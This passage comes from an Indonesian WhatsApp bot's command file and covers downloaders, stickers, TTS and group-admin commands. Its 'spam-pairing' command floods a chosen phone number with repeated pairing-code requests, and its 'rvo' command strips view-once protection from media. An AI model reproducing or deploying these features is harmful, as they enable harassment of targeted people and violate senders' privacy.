                headers.Cookie = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');

                const [filename, mimetype, downloadLink] = [
                    response.data.match(/<h1 class="intro">(.*?)<\/h1>/s)?.[1] || '',
                    response.data.match(/<div class="list">.*? - (.*?)<\/div>/)?.[1] || '',
                    response.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1]
                ];
                
                if (!downloadLink) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Download link tidak ditemukan!' };

                headers.Referer = downloadLink;
                const final = await axios.get(downloadLink, { headers });

                const [directLink, key, filesize] = [
                    final.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1],
                    final.data.match(/&k='\+(.*?)';/)?.[1].replace(`'`, ''),
                    final.data.match(/Download File (.*?)/)?.[1]
                ];

                const result = directLink + (key ? `&k=${key}` : '');
                if (!result) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Direct Link Download tidak ditemukan!' };

                const data = await this.convert(result, url);

                return { creator: 'Daffa ~', status: 'success', code: 200, data: { filename, filesize, mimetype, result: data } };
            } catch (error) {
                return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: error };
            }
        },

        convert: async function(url, directLink) {
            try {
                const init = await axios.get(url, {
                    maxRedirects: 0,
                    validateStatus: status => status >= 200 && status < 303,
                    headers: {
                        'Referer': directLink,
                        'User-Agent': 'Postify/1.0.0'
                    },
                });

                const cookies = init.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
                const redirect = init.headers.location;

                const final_result = await axios.get(redirect, {
                    responseType: 'arraybuffer',
                    headers: {
                        'referer': directLink,
                        'user-agent': 'Postify/1.0.0',
                        'cookie': cookies,
                    },
                });

                const filename = final_result.headers['content-disposition']?.match(/filename=["']?([^"';]+)["']?/)?.[1] || 'Tidak diketahui';
                return {
                    filename,
                    mimeType: final_result.headers['content-type'],
                    buffer: Buffer.from(final_result.data)
                };
            } catch (error) {
                throw error;
            }
        }
    };

    try {
        let hasil = await sfile.download(text);
        let sfdl = hasil.data.result;

        await xyu.sendMessage(m.chat, {document: sfdl.buffer, mimetype: sfdl.mimeType, fileName: sfdl.filename }, {quoted:m});
    } catch (err) {
        console.error(err);
    }
    }
    break;

//================================================================================

case 'setppbot': {
				if (!isCreator) return m.reply(mess.owner)
				if (!/image/.test(mime)) return m.reply(`Reply Image Dengan Caption ${prefix + command}`)
				let media = await xyu.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
				if (text.length > 0) {
					let { img } = await generateProfilePicture(media)
					await xyu.query({
						tag: 'iq',
						attrs: {
							to: botNumber,
							type: 'set',
							xmlns: 'w:profile:picture'
						},
						content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]
					})
					await fs.unlinkSync(media)
					m.reply('Sukses')
				} else {
					await xyu.updateProfilePicture(botNumber, { url: media })
					await fs.unlinkSync(media)
					m.reply('Sukses')
				}
			}
			break
//================================================================================

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await xyu.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await xyu.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(() => m.reply("Error! Result Not Found"))
}
break

//================================================================================


case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    xyu.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================

case 'brat': {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
  if (!quo) return m.reply("masukan teksnya woii");
async function brat(text) {
  try {
    return await new Promise((resolve, reject) => {
      if(!text) return reject("missing text input");
      axios.get("https://brat.caliphdev.com/api/brat", {
        params: {
          text
        },
        responseType: "arraybuffer"
      }).then(res => {
        const image = Buffer.from(res.data);
        if(image.length <= 10240) return reject("failed generate brat");
        return resolve({
          success: true, 
          image
        })
      })
    })
  } catch (e) {
    return {
      success: false,
      errors: e
    }
  }
}

const buf = await brat(quo);
await xyu.imgToSticker(m.chat, buf.image, m, { packname: "Yudis_299", author: "Yudis - Botz" })
}
break

case 'bratvid': case 'bratvideo': case 'brat2': {
 if (!text) return m.reply(`Contoh: ${prefix+command} hai`)
 if (text.length > 250) return m.reply(`Karakter terbatas, max 250!`)
 

 const words = text.split(" ")
 const tempDir = path.join(process.cwd(), 'lib')
 if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir)
 const framePaths = []

 try {
 for (let i = 0; i < words.length; i++) {
 const currentText = words.slice(0, i + 1).join(" ")

 const res = await axios.get(
 `https://brat.caliphdev.com/api/brat?text=${encodeURIComponent(currentText)}`,
 { responseType: "arraybuffer" }
 ).catch((e) => e.response)

 const framePath = path.join(tempDir, `frame${i}.mp4`)
 fs.writeFileSync(framePath, res.data)
 framePaths.push(framePath)
 }

 const fileListPath = path.join(tempDir, "filelist.txt")
 let fileListContent = ""

 for (let i = 0; i < framePaths.length; i++) {
 fileListContent += `file '${framePaths[i]}'\n`
 fileListContent += `duration 0.7\n`
 }

 fileListContent += `file '${framePaths[framePaths.length - 1]}'\n`
 fileListContent += `duration 2\n`

 fs.writeFileSync(fileListPath, fileListContent)
 const outputVideoPath = path.join(tempDir, "output.mp4")
 execSync(
 `ffmpeg -y -f concat -safe 0 -i ${fileListPath} -vf "fps=30" -c:v libx264 -preset ultrafast -pix_fmt yuv420p ${outputVideoPath}`
 )

 await xyu.sendImageAsSticker(m.chat, outputVideoPath, m, {
 packname: '',
 author: `Yudis_299`
 })

 framePaths.forEach((frame) => {
 if (fs.existsSync(frame)) fs.unlinkSync(frame)
 })
 if (fs.existsSync(fileListPath)) fs.unlinkSync(fileListPath)
 if (fs.existsSync(outputVideoPath)) fs.unlinkSync(outputVideoPath)
 } catch (e) {
 console.error(e)
 m.reply('Terjadi kesalahan')
 }
}
break
//================================================================================

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await xyu.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: xyu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await xyu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await xyu.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================


case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await xyu.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break

//================================================================================

case 'delcase': {
if (!isCreator) return reply(`ᴋʜᴜsᴜs owner`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./case.js', q)
reply('*Dellcase Successfully*')
}
break


case 'd': case 'del': {
                if (!isCreator) return reply(mess.only.owner)
                if (!m.quoted) return reply('Reply pesan yang ingin dihapus!')
                let { chat, id } = m.quoted
                xyu.sendMessage(m.chat, { 
                    delete: { 
                        remoteJid: m.chat, 
                        fromMe: false, 
                        id: m.quoted.id, 
                        participant: m.quoted.sender 
                    } 
                })
            }
            break

//================================================================================

case "shortlink": case "shorturl": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!m.isGroup) return reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await xyu.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await xyu.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await xyu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: xyu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await xyu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break


//================================================================================

case 'gpt': case 'ai' :{
  if (!text) return reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let kanjuthann = await openai(text, "nama mu adalah Tenrai-Botz, kamu adalah asisten kecerdasan buatan yang sering membantu orang lain jika ada yang ditanyakan")
reply(kanjuthann)
}
break


//================================================================================


            
case 's': case 'stiker': case 'sticker': {
if (/image/.test(mime)) {
let media = await xyu.downloadAndSaveMediaMessage(quoted, + new Date * 1)
xyu.sendImageAsSticker(from, media, qtext, {packname: '© 𝙰𝚄𝚃𝙷𝙾𝚁 Y u d i s', author: 'Yudis_299'})
await fs.unlinkSync(media)
} else if (/video/.test(mime)) {
if (quoted.seconds > 11) return reply795('Maksimal 10 detik!')
let media = await xyu.downloadAndSaveMediaMessage(quoted, + new Date * 1)
xyu.sendVideoAsSticker(from, media, qtext, {packname: '© 𝙰𝚄𝚃𝙷𝙾𝚁 Y u d i s', author: 'yudis_299'})
await fs.unlinkSync(media)
} else reply795(`Kirim atau reply gambar dengan caption ${prefix+command}`)
}
break
                
//================================================================================
case 'smeme': 
{
 if (!text) reply`Balas Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
atas = text.split('|')[0] ? text.split('|')[0] : '-'
bawah = text.split('|')[1] ? text.split('|')[1] : '-'
mee = await xyu.downloadAndSaveMediaMessage(quoted)
mem = await uploadToCatbox(mee)
kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${text}.png?background=${mem}`)
                    xyu.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
                }
                }
                break

//================================================================================

case 'rvo':
case '😂²':
case '🤣²':
case 'lihat': {
    try {
        const quotedMessage = m.message.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quotedMessage?.viewOnceMessageV2) return reply('Silakan reply pesan *1x lihat* (view once).');
        let type = Object.keys(quotedMessage.viewOnceMessageV2.message)[0];
        let messageContent = quotedMessage.viewOnceMessageV2.message[type];
        let mediaStream = await downloadContentFromMessage(
            messageContent,
            type === 'imageMessage' ? 'image' : 'video'
        );
        let buffer = Buffer.from([]);
        for await (const chunk of mediaStream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        let caption = messageContent.caption || '';
        if (/video/.test(type)) {
            await xyu.sendMessage(m.chat, { video: buffer, caption }, { quoted: m });
        } else if (/image/.test(type)) {
            await xyu.sendMessage(m.chat, { image: buffer, caption }, { quoted: m });
        } else {
            return reply('Tipe file tidak didukung.');
        }
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat memproses pesan.');
    }
}
break;

//================================================================================

case "tourl": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let media = await xyu.downloadAndSaveMediaMessage(qmsg)
const { ImageUploadService } = require('node-upload-images')
const service = new ImageUploadService('pixhost.to');
let { directLink } = await service.uploadFromBinary(fs.readFileSync(media), 'Tenrai - Bot.png');

let teks = directLink.toString()
await xyu.sendMessage(m.chat, {text: teks}, {quoted: m})
await fs.unlinkSync(media)
}
break

//================================================================================

case "remini": case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await xyu.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await xyu.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

//================================================================================

case "add": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await xyu.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await xyu.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

//================================================================================

case "kick": case "kik": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await xyu.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//================================================================================

case "get": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("https://example.com"))
let data = await fetchJson(text)
m.reply(JSON.stringify(data, null, 2))
}
break

//================================================================================

case "revoke": case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await xyu.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//================================================================================

case "tagall": {
if (!m.isGroup) return reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await xyu.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//================================================================================

case "linkgroup": case "linkgrup": case "linkgc": {
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await xyu.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await xyu.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//================================================================================

case "h": case "hidetag": {
if (!m.isGroup) return reply(mess.group);
if (!isCreator && !m.isAdmin) return reply(mess.admin);
let text = m.quoted ? m.quoted.text : m.text.split(" ").slice(1).join(" ");
if (!text) return m.reply(example("pesannya"));
let member = m.metadata.participants.map(v => v.id);
await xyu.sendMessage(m.chat, { text: text, mentions: [...member] }, { quoted: m });
}
break;

//================================================================================

case 'upch':
case 'upaudio': {
    if (!isCreator) return reply(mess.owner);
    if (!/audio/.test(mime)) return reply(`Reply audio dan tambahkan caption! *Contoh:* ${prefix + command} Judul|Deskripsi Audio`);
    const args = text ? text.split('|') : [];
    const title = args[0]?.trim();
    const description = args[1]?.trim() || "Tidak ada deskripsi";
    xyu.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
    await sleep(5000);
    xyu.sendMessage('120363365201577876@newsletter', {
        audio: await quoted.download(),
        viewOnce: false,
        ptt: true,
        mimetype: 'audio/mpeg',
        fileName: title ? `${title}.mp3` : 'audio.mp3',
        waveform: [0, 153, 0, 494, 976],
        contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: title || "Musik Tanpa Judul",
                newsletterJid: '120363365201577876@newsletter'
            }
        },
        caption: title ? `Judul: ${title}\nDeskripsi: ${description}` : `Deskripsi: ${description}`
    });
    await sleep(2000);
    xyu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
}
break;

//================================================================================

case "on": case "off": {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
let gc = Object.keys(db.groups[m.chat])
if (!text || isNaN(text)) {
let teks = "\n*乂 List opstion group settings*\n\n"
await gc.forEach((i, e) => {
teks += `* ${e + 1}. ${capital(i)} : ${db.groups[m.chat][i] ? "_aktif_" : "_tidak aktif_"}\n`
})
teks += `\n Contoh penggunaan *.${command}* 1\n`
return m.reply(teks)
}
const num = Number(text)
let total = gc.length
if (num > total) return
const event = gc[num - 1]
global.db.groups[m.chat][event] = command == "on" ? true : false
return m.reply(`Berhasil *${command == "on" ? "mengaktifkan" : "mematikan"} ${event}* di grup ini`)
}
break

//================================================================================

case "closegc": case "close": 
case "opengc": case "open": {
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await xyu.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await xyu.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "demote":
case "promote": {
if (!m.isGroup) return reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await xyu.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await xyu.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================


 case 'cekkhodam': 
case 'cekkodam':
 if (!text) return reply('Nama nya?');
 function pickRandom(list) {
 return list[Math.floor(Math.random() * list.length)];
 }
 // Daftar nama khodam acak
 const ceknyaa = pickRandom([
 "Kaleng Cat Avian", "Pipa Rucika", "Botol Tupperware", "Badut Mixue", 
 "Sabun GIV", "Sandal Swallow", "Jarjit", "Ijat", "Fizi", "Mail", "Ehsan", 
 "Upin", "Ipin", "Sungut Lele", "Tok Dalang", "Opah", "Opet", "Alul", 
 "Pak Vinsen", "Maman Resing", "Pak RT", "Admin ETI", "Bung Towel", 
 "Lumpia Basah", "Martabak Manis", "Baso Tahu", "Tahu Gejrot", "Dimsum", 
 "Seblak Ceker", "Telor Gulung", "Tahu Aci", "Tempe Mendoan", "Nasi Kucing", 
 "Kue Cubit", "Tahu Sumedang", "Nasi Uduk", "Wedang Ronde", "Kerupuk Udang", 
 "Cilok", "Cilung", "Kue Sus", "Jasuke", "Seblak Makaroni", "Sate Padang", 
 "Sayur Asem", "Kromboloni", "Marmut Pink", "Belalang Mullet", "Kucing Oren", 
 "Lintah Terbang", "Singa Paddle Pop", "Macan Cisewu", "Vario Mber", 
 "Beat Mber", "Supra Geter", "Oli Samping", "Knalpot Racing", "Jus Stroberi", 
 "Jus Alpukat", "Alpukat Kocok", "Es Kopyor", "Es Jeruk", "Cappucino Cincau", 
 "Jasjus Melon", "Teajus Apel", "Pop ice Mangga", "Teajus Gulabatu", 
 "Air Selokan", "Air Kobokan", "TV Tabung", "Keran Air", "Tutup Panci", 
 "Kotak Amal", "Tutup Termos", "Tutup Botol", "Kresek Item", "Kepala Casan", 
 "Ban Serep", "Kursi Lipat", "Kursi Goyang", "Kulit Pisang", "Warung Madura", 
 "Gorong-gorong", "Tai Kuda", "Tikus Kentut", "Banteng Merah", "Bajigur", 
 "Bakso Sumatra", "Neymar Bogor", "Christiano Rojali", "Batagor", 
 "Seblak Kalimantan", "Macan Putih", "Harimau Sumatra", "Harimau Putih", 
 "Singa", "Raja Iblis", "Telur Betawi", "Cilok Goreng"
 ]);
 const damping = pickRandom(['1 tahun lalu', '2 tahun lalu', '3 tahun lalu', '4 tahun lalu', 'lahir']);
 const khodam = `Khodam ${text}, adalah ${ceknyaa}, mendampingi dari ${damping}`;

 // Menggunakan TTS dengan node-gtts
 const { tts } = require('./lib/tts');
 let audioBuffer = await tts(khodam);
 
 // Kirim pesan berupa audio
 xyu.sendMessage(m.chat, {
 audio: audioBuffer,
 mimetype: 'audio/mpeg',
 ptt: true
 }, { quoted: m });
 break;

case 'texttospech': case 'tts': case 'tospech': {
				if (!text) return m.reply('Mana text yg mau diubah menjadi audio?')
				let { tts } = require('./lib/tts')
				let anu = await tts(text)
				xyu.sendMessage(m.chat, { audio: anu, ptt: true, mimetype: 'audio/mpeg' }, { quoted: m })
			}
			break
case 'addcase': {
if (!isCreator) return reply("khusus Owner")
    if (!q) return reply('Mana case nya');
    const fs = require('fs');
const namaFile = 'case.js';
const caseBaru = `${q}`;
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('Terjadi kesalahan saat membaca file:', err);
        return;
    }
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                reply('Terjadi kesalahan saat menulis file:', err);
            } else {
                reply('Case baru berhasil ditambahkan!');
            }
        });
    } else {
        reply('Tidak dapat menemukan case gimage dalam file.');
    }
});

}
break

//================================================================================

case "developerbot": case "owner": {
await xyu.sendContact(m.chat, [global.owner], m)
}
break
//================================================================================

case 'spam-pairing': case 'spam': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} +6288221325473|150`)
let [peenis, pepekk = "200"] = text.split("|")

let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
//================================================================================

case "self": {
if (!isCreator) return
xyu.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//================================================================================

case 'getcase': {
    const getCase = (cases) => {
        return "case " + `'${cases}'` + fs.readFileSync("./case.js").toString().split('case \'' + cases + '\'')[1].split("break")[0] + "break";
    };
    try {
        if (!isCreator) return m.reply('ngapain');
        if (!q) return m.reply(`contoh : ${prefix + command} antilink`);
        let nana = await getCase(q);
        m.reply(nana);
    } catch (err) {
        console.log(err);
        m.reply(`Case ${q} tidak di temukan`);
    }
}
break;

//================================================================================

case "public": {
if (!isCreator) return
xyu.public = true
m.reply("Berhasil mengganti ke mode *public*")
}
break

//================================================================================

case 'getsc': {
    const fs = require("fs");
    const execSync = require("child_process").execSync;

    let dir = await fs.readdirSync('./database/sampah');
    if (dir.length >= 2) {
        let res = dir.filter(e => e !== "A");
        for (let i of res) await fs.unlinkSync(`./database/sampah/${i}`);
    }

    await m.reply("Memproses backup script bot");
    let name = "Haruka-V1";
    const ls = (await execSync("ls")).toString().split("\n").filter(pe =>
        pe !== "node_modules" &&
        pe !== "session" &&
        pe !== "package-lock.json" &&
        pe !== "yarn.lock" &&
        pe !== ""
    );

    const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`);
    await xyu.sendMessage(m.sender, {
        document: await fs.readFileSync(`./${name}.zip`),
        fileName: `${name}.zip`,
        mimetype: "application/zip"
    }, { quoted: m });

    await execSync(`rm -rf ${name}.zip`);
    if (m.chat !== m.sender) return m.reply("Script bot berhasil dikirim ke private chat");
    }
    break;


//================================================================================

case "listowner": case "listown": {
if (owners.length < 1) return m.reply("Tidak ada owner tambahan")
let teks = `\n *乂 List all owner tambahan*\n`
for (let i of owners) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
xyu.sendMessage(m.chat, {text: teks, mentions: owners}, {quoted: m})
}
break

//================================================================================

case "delowner": case "delown": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner utama!`)
if (!owners.includes(input)) return m.reply(`Nomor ${input2} bukan owner bot!`)
let posi = owners.indexOf(input)
await owners.splice(posi, 1)
await fs.writeFileSync("./database/owner.json", JSON.stringify(owners, null, 2))
m.reply(`Berhasil menghapus owner ✅`)
}
break

//================================================================================

case "addowner": case "addown": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
